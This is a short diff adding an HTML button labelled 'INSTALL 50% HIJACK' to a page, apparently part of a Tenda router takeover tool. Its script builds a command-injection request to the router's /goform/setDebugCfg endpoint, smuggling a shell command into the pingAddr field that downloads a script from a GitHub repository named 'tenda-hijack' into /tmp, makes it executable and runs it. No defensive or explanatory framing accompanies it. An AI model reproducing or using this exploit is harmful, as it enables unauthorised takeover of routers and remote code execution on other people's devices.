@@ -1,0 +1,7 @@
+<script>
+function install() {
+    const cmd = "cd /tmp; wget -q https://raw.githubusercontent.com/Oky12345/tenda-hijack/main/ROUTER_SCRIPTS/auto_install.sh -O install.sh; chmod +x install.sh; ./install.sh";
+    prompt("Copy command untuk router:", "fetch('/goform/setDebugCfg', {method:'POST',body:'module=ping_test&pingAddr=' + encodeURIComponent(\";" + cmd + ";\")})");
+}
+</script>
+<button onclick="install()">🔥 INSTALL 50% HIJACK</button>
